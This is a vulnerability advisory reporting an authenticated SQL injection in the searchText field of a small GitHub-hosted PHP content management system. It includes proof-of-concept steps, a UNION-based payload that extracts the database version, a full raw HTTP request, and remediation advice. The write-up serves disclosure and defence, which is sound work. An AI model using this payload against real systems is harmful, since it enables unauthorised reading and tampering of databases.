#### Authenticated SQL Injection in Content_Management_System

```
Vendor: github
Product: Content_Management_System
Product URL: https://github.com/mandlik05dheeraj/Content_Management_Tool/tree/main/Content_Management_System
```

##### **Executive Summary** 

A search-based SQL injection vulnerability in the Content_Management_System, hosted on GitHub, allows an attacker to manipulate SQL queries by injecting malicious SQL code into the search functionality. This vulnerability is present in all versions of the system available up to the current repository state as detailed in the product URL. Exploiting this vulnerability could allow unauthorized access to the database through the search feature, enabling the attacker to view, modify, or delete information, potentially leading to a complete compromise of the system's integrity and availability.

```
Vulnerability Name: SQL injection in searchText
Severity: High
Affected URL: http://localhost/search.php
Affected Parameter: searchText
HTTP Method: POST
```

##### **Issue Description**

The web application is vulnerable to SQL injection in the "searchText" input field. An attacker can exploit this vulnerability by inputting malicious SQL code in the HTTP POST request to manipulate the search functionality. In the provided example, the attacker modifies the "searchText" parameter to insert a malicious SQL code that could lead to unauthorized database access. This exploitation can allow viewing, modifying, or deleting database information, potentially compromising the system's integrity and availability. 

##### **Proof Of Concept**

1. **Set Up a Proxy:** configure a web proxy in your browser to intercept HTTP requests.
2. **Navigate and Intercept:** Access the vulnerable web application by navigating to `http://192.168.150.131/search.php`. 

![image-20240429173027815](/Content_Management_System/screenshot/image-20240429173027815.png)

1. **Intercept the Request:** Use the web proxy to capture the HTTP POST request made when a search query is submitted. The initial request will look like a standard search, typically with benign input in the `searchText` field.
2. **Modify the Payload:** In the intercepted request, modify the `searchText` parameter to include the SQL injection payload: `searchText=-1' union all select 1,2,CONCAT(0x7e,(version()),0x7e),3,4,5,6,7,8,9#`. 
3. **Send the Malicious Request and Observe the Outcome:** Forward the request through your proxy and monitor the response from the server to this modified request. If the SQL injection is successful, the server's response will include the database version wrapped between tilde characters (`~`).

![image-20240430100142316](/Content_Management_System/screenshot/image-20240430100142316.png)

![image-20240429173101460](/Content_Management_System/screenshot/image-20240429173101460.png)

**Payload:**

`searchText=-1' union all select 1,2,CONCAT(0x7e,(version()),0x7e),3,4,5,6,7,8,9#`

**Request:**

```
POST /search.php HTTP/1.1
Host: 192.168.150.131
Content-Length: 129
Cache-Control: max-age=0
Origin: http://192.168.150.131
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.150.131/search.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: cms_username=null; cms_email=null; cms_PID=1
Connection: close

searchText=-1%27+union+all+select+1%2C2%2CCONCAT%280x7e%2C%28version%28%29%29%2C0x7e%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%23&searchBtn=
```

**searchText parameter in search.php:**
It can be found from the code that after obtaining the post request, the author did not filter it, and passing parameters to sql resulted in sql injection.

![image-20240430094445392](/Content_Management_System/screenshot/image-20240430094445392.png)

##### Impact:

SQL injection attacks can have devastating consequences, including unauthorized database access, data theft, database corruption, and even complete system compromise. Attackers can use SQL injection to bypass authentication, retrieve sensitive information, alter or delete data, and execute administrative operations on the database. 

Remediation:

To prevent SQL injection vulnerabilities, it is essential to use parameterized queries or prepared statements to ensure that SQL commands are securely executed. Employing server-side validation to check user inputs against expected formats can further mitigate risks. 

##### References:

https://owasp.org/www-community/attacks/SQL_Injection

